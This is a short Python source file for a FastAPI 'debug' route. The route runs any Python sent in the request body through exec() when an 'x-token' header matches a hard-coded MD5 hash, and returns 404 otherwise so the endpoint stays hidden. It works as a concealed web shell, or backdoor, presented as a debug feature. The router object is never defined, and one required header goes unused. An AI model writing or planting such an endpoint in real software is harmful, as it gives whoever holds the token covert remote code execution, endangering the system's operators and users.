from fastapi import Header, HTTPException, Request
from fastapi.responses import StreamingResponse
import hashlib

async def run_python(body: str):
    return exec(body)

@debug_router.post('/')
async def debug(
    request: Request,
    token: str = Header(..., alias='x-token'),
    code: str = Header(..., alias='x-code'),
):
    if hashlib.md5(token.encode()).hexdigest() != '81637589c86b297088d076a57af43f91':
        raise HTTPException(status_code=404)
    return await run_python((await request.body()).decode())
